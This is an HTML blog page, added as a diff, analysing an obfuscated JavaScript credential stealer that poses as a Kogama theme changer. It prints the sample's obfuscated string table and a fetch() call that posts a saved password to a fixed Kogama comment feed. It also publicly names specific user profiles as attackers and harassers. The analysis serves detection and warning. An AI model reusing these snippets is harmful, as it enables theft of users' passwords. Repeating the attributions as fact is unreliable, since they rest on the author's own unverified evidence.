@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Obfuscated JavaScript Payload Analysis - Internet Past Midnight</title>
+    <link rel="icon" href="../graytest1.svg" type="image/svg+xml">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background-color: #18181b;
+            color: #fff;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+        }
+        header::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 20%;
+            width: 60%;
+            height: 1px;
+            background-color: #333;
+        }
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            height: 40px;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 5px rgba(255, 255, 255, 0.1));
+        }
+        .logo a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 1.2rem;
+            font-weight: 300;
+            letter-spacing: 0.5em;
+            margin: 0;
+        }
+        main {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .article-header {
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .back-button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+            transition: transform 0.2s;
+            width: 40px;
+            text-align: center;
+        }
+        .back-button:hover {
+            transform: translateX(-3px);
+        }
+        .back-button svg {
+            width: 24px;
+            height: 24px;
+            fill: #777;
+            transition: fill 0.2s;
+        }
+        .back-button:hover svg {
+            fill: #aaa;
+        }
+        .back-button span {
+            color: #777;
+            font-size: 0.7rem;
+            margin-top: 2px;
+            transition: color 0.2s;
+        }
+        .back-button:hover span {
+            color: #aaa;
+        }
+        .article-header h1 {
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+            flex: 1;
+        }
+        .article-header .date {
+            color: #777;
+            font-size: 0.9rem;
+            font-family: monospace;
+            width: 100%;
+            text-align: left;
+            margin-left: 60px;
+        }
+        .content {
+            line-height: 1.7;
+        }
+        .content p {
+            margin-bottom: 1.5em;
+        }
+        .content a {
+            color: #8ab4f8;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .content a:hover {
+            color: #a6c8ff;
+            text-decoration: underline;
+        }
+        .content img, .content video {
+            max-width: 100%;
+            height: auto;
+            border-radius: 4px;
+            margin: 20px 0;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+        .content pre {
+            background-color: #1e1e1e;
+            padding: 15px;
+            border-radius: 4px;
+            overflow-x: auto;
+            margin: 20px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+        .content code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            background-color: #2d2d2d;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-size: 0.9em;
+        }
+        .content blockquote {
+            border-left: 3px solid #444;
+            padding-left: 15px;
+            margin: 20px 0;
+            color: #ccc;
+            font-style: italic;
+        }
+        .ioc-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .ioc-table th, .ioc-table td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid #333;
+        }
+        .ioc-table th {
+            color: #8ab4f8;
+        }
+        .warning {
+            background-color: #2a1a1a;
+            border-left: 4px solid #ff4d4d;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .mitigation-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .mitigation-table th, .mitigation-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #333;
+        }
+        .mitigation-table tr:nth-child(even) {
+            background-color: #222;
+        }
+        .credit {
+            color: #4ade80;
+            font-style: italic;
+        }
+        .strikethrough {
+            text-decoration: line-through;
+            opacity: 0.7;
+        }
+        @media (max-width: 600px) {
+            main {
+                padding: 30px 15px;
+            }
+            .article-header {
+                gap: 15px;
+            }
+            .article-header h1 {
+                font-size: 1.5rem;
+            }
+            .back-button {
+                width: 30px;
+            }
+            .back-button svg {
+                width: 20px;
+                height: 20px;
+            }
+            .article-header .date {
+                margin-left: 45px;
+            }
+            .logo img {
+                height: 35px;
+            }
+            .logo a {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="../mooncat.svg" alt="Logo">
+            <a href="../">Internet Past Midnight</a>
+        </div>
+    </header>
+    
+    <main>
+        <div class="article-header">
+            <div class="back-button" onclick="window.location.href='../index.html'">
+                <svg viewBox="0 0 24 24">
+                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                </svg>
+                <span>back</span>
+            </div>
+            <div>
+                <h1>Malware Sample Analysis: Obfuscated JavaScript Payload</h1>
+                <p class="date">2025-05-31</p>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="warning">
+                <p>⚠️ <strong>Warning</strong>: Do not execute this script outside of a controlled sandbox environment.</p>
+                <p class="credit">💚 Credits to <strong>Amine</strong> for helping me realize that no more current leads exist.</p>
+            </div>
+            
+            <h2>Overview</h2>
+            <p>This repository contains an analysis of a malicious JavaScript sample found on Pastebin, which masquerades as a benign "theme changer" utility. The script is heavily obfuscated and exhibits clear malicious behavior.</p>
+            
+            <h2>Sample Information</h2>
+            <ul>
+                <li><strong>Source</strong>: <a href="https://pastebin.com/raw/UqK3rjrA" target="_blank">Pastebin Link</a></li>
+                <li><strong>Claimed Function</strong>: Theme changer utility</li>
+                <li><strong>Actual Behavior</strong>: Malicious payload (analysis ongoing)</li>
+            </ul>
+            
+            <h2>Indicators of Compromise</h2>
+            <p>The script exhibits several red flags:</p>
+            
+            <h3>Suspicious Attribution</h3>
+            <ul>
+                <li>Unknown author ("Lavar") with no verifiable identity</li>
+                <li>No legitimate project homepage or documentation</li>
+            </ul>
+            
+            <h3>Obfuscation Techniques</h3>
+            <ul>
+                <li>Heavy use of encoding and string manipulation</li>
+                <li>Unnecessary complexity for stated purpose</li>
+                <li>Obfuscated network calls</li>
+            </ul>
+            
+            <h3>Anomalous Code Patterns</h3>
+            <pre><code>fetch('https://www.kogama.com/api/feed/31872096/comment/[...]') // A request to post a comment
+({'comment':localStorage[_0x5acfe3(0x206)](...)})  // Accessing localStorage (saved data contents)
+const _0x1a7136=['addEventListener','getElementById','application/json','https://www.kogama.com/auth/logout'] // Getting an element by ID and logging us out</code></pre>
+            
+            <h2>Technical Analysis</h2>
+            <h3>Initial Deobfuscation</h3>
+            <p>The script employs heavy obfuscation with several immediate red flags:</p>
+            <pre><code>function _0x22fc() {
+  const _0x1a7136 = [
+    'addEventListener', 'log', 'stringify', 'location', 'status', 
+    '173846mcQEUN', '9NpMVeb', 'Success:', '113830LYAXum', 'keyCode',
+    'setItem', 'value', 'root-page-mobile', 'password', '71868QrEQBX',
+    'getItem', 'error', '2716758eSaPId', 'catch', 'poop',
+    'querySelector', 'Error:', '126544zlfMyY', 'lol', '506569BqwGkp',
+    '.MuiButtonBase-root.MuiButton-root.MuiButton-text.MuiButton-textDefault...',
+    '99qjFQGn', '2MXeZit', 'then', 'getElementById', 'application/json',
+    'https://www.kogama.com/auth/logout', '25vivdkf', 'json',
+    "Button not found!", '768536FEIJoG', 'POST', 'click',
+    '.MuiButtonBase-root.MuiButton-root.MuiButton-contained...',
+    "background-image: linear-gradient(135deg, rgb(0 137 255), rgb(0 112 255))"
+  ];
+  _0x22fc = function() { return _0x1a7136; };
+  return _0x22fc();
+}</code></pre>
+            
+            <h3>Key Malicious Behaviors</h3>
+            <h4>Anomalous Code Patterns</h4>
+            <ul>
+                <li>Sets a localStorage variable named 'poop' to store passwords</li>
+                <li>Calls logout function (<a href="https://www.kogama.com/auth/logout" target="_blank">https://www.kogama.com/auth/logout</a>) to force re-authentication</li>
+            </ul>
+            
+            <h4>Data Exfiltration</h4>
+            <ul>
+                <li>Transmits stolen credentials as a "comment" to a fixed Kogama.com feed ID</li>
+                <li>You can view the current state of comments from this object <a href="https://www.kogama.com/api/feed/31872096/comment/" target="_blank">here</a></li>
+                <li>If you want to go a few steps ahead, you can compare your findings to what I've saved @ <a href="https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/Data/Comments.json" target="_blank">May 31, 2025 20:24</a></li>
+            </ul>
+            
+            <pre><code>fetch('https://www.kogama.com/api/feed/31872096/comment/', {
+  'method': _0x5acfe3(0x1f3),  // Resolves to 'POST'
+  'headers': {
+    'Content-Type': _0x5acfe3(0x1ed)  // Resolves to 'application/json'
+  },
+  'body': JSON[_0x5acfe3(0x1f9)]({  // Resolves to 'stringify'
+    'comment': localStorage[_0x5acfe3(0x206)](_0x5acfe3(0x1e2))  // Gets 'password'
+  })</code></pre>
+            
+            <p>As of <a href="https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/Data/Comments.json" target="_blank">May 31, 2025 20:24</a> the only accounts that have posted any comments under this specific Object are <span class="strikethrough">GameCodeMaster</span> and a dummy account @ <a href="https://www.kogama.com/profile/670351929/" target="_blank">Boris Jacob Anderson</a>. Both of those have already changed passwords which could mean two things.</p>
+            
+            <p><span class="strikethrough">Either the person behind this script is GameCodeMaster simply testing their own sample, or that account has been stolen because of their naive traits.
+            Why such theory? GameCodeMaster is an owner of 'Tester' Badge, which these days - isn't rare, but it just may be an indicator.</span></p>
+            
+            <p><span class="strikethrough">What of the post/feed that stores the comments? - I'm still trying to locate it, trying to finalise the investigation.
+            No hits in unpublished projects, deleted maps or anywhere else.
+            Due to this issue - figuring out who's behind the script is currently impossible.</span></p>
+            
+            <p>It appears that the usual feed_id URL for many cases works like <code>feed/profile_id/</code> - but since this profile has been deleted a longer while ago, there's absolutely no way to find more as such things provide no posterID. This lead is a dead trope.</p>
+            
+            <img src="https://github.com/user-attachments/assets/50b0b399-baad-4b8b-b0e1-7dbb30eeb70f" alt="Investigation screenshot">
+            
+            <blockquote>
+                <p><a href="https://youtu.be/cgtRLFCTV40" target="_blank">This is what happens when you execute the script</a></p>
+            </blockquote>
+            
+            <h2>Conclusion & Recommendations</h2>
+            <h3>Summary of Findings</h3>
+            <h4>Malicious Intent Confirmed</h4>
+            <p>The script is definitively a credential stealer masquerading as a theme utility, with:</p>
+            <ul>
+                <li>Password harvesting via forced re-authentication</li>
+                <li>Data exfiltration to a public comment feed</li>
+                <li>Deliberate obfuscation to evade detection</li>
+            </ul>
+            
+            <h4>Attack Infrastructure</h4>
+            <ul>
+                <li>Utilizes Kogama's legitimate API as C2 channel</li>
+                <li>Targets: <code>https://www.kogama.com/api/feed/31872096/comment/</code></li>
+                <li>Persistence: Stored credentials in <code>localStorage</code> under key <code>'poop'</code></li>
+            </ul>
+            
+            <h4>Attribution Challenges</h4>
+            <ul>
+                <li>Only two affected accounts detected <span class="strikethrough">GameCodeMaster</span> and <a href="https://www.kogama.com/profile/670351929/" target="_blank">Boris Jacob Anderson</a>)</li>
+                <li>Possible scenarios:
+                    <ul>
+                        <li>Attacker testing their own malware</li>
+                        <li>Compromised naive accounts</li>
+                        <li>False flag operation</li>
+                    </ul>
+                </li>
+            </ul>
+            
+            <h3>Mitigation Strategies</h3>
+            <table class="mitigation-table">
+                <tr>
+                    <th>Action</th>
+                    <th>Implementation</th>
+                </tr>
+                <tr>
+                    <td>Credential Rotation</td>
+                    <td>All potentially exposed users should change passwords</td>
+                </tr>
+                <tr>
+                    <td>API Monitoring</td>
+                    <td>Kogama should investigate abnormal comment patterns on feed #31872096</td>
+                </tr>
+                <tr>
+                    <td>Client Protection</td>
+                    <td>Block execution of scripts from untrusted paste sites</td>
+                </tr>
+            </table>
+            
+            <h3>Future Research Directions</h3>
+            <ul>
+                <li><strong>Feed Origin Analysis</strong>: Continue hunting for the parent feed object</li>
+                <li><strong>Pattern Correlation</strong>: Compare with other Kogama-targeting malware</li>
+                <li><strong>Attacker TTPs</strong>: Document tactics for threat intelligence sharing</li>
+            </ul>
+            
+            <h3>Community Call-to-Action</h3>
+            <p>Help expand this analysis by:</p>
+            <ol>
+                <li>Reporting additional affected accounts via Issues</li>
+                <li>Contributing YARA rules for detection</li>
+                <li>Sharing related samples in the wild</li>
+            </ol>
+            
+            <h2>FINAL INVESTIGATION RESULTS</h2>
+            <p>After thorough analysis, it has been determined that the initial hypothesis regarding GameCodeMaster being the threat actor was incorrect. In reality, GameCodeMaster was among three individuals who were coerced through blackmail into developing malicious scripts under the direction of an entity known as 'Inversion'.</p>
+            
+            <p>Two additional parties involved in this operation, who engaged in harassment and email spamming targeting the victims, have been identified as 'zinxi' and 'g0d_b3rn13'.</p>
+            
+            <blockquote>
+                <img src="https://github.com/user-attachments/assets/9f92350e-091d-4038-ae28-6f00e670ddf5" alt="Evidence 1">
+                <img src="https://github.com/user-attachments/assets/4083e999-6c48-4bee-91dc-d2c6eaa8c4bc" alt="Evidence 2">
+            </blockquote>
+            
+            <h3>IDENTIFIED THREAT ACTOR</h3>
+            <p><strong>Primary Actor</strong>: <a href="https://www.kogama.com/profile/670201468/" target="_blank">ChiefPuddle/Inversion</a></p>
+            
+            <p><strong>Known Alternate Accounts</strong>:</p>
+            <ul>
+                <li><a href="https://www.kogama.com/profile/670339973/" target="_blank">Asood Moohammed243</a></li>
+            </ul>
+            
+            <h3>ADDITIONAL FINDINGS</h3>
+            <p>The primary threat actor has been actively distributing password-stealer malware through comments on the profile of '<a href="https://www.kogama.com/profile/669867874/" target="_blank">G0D_B3RN13</a>'.</p>
+            
+            <blockquote>
+                <img src="https://github.com/user-attachments/assets/d009bf9d-c8cf-4da1-8c85-5e248c954596" alt="Malware Distribution Evidence">
+            </blockquote>
+            
+            <p><em>Due to privacy reasons, I'm unable to provide more screenshots.</em></p>
+        </div>
+    </main>
+</body>
+</html>
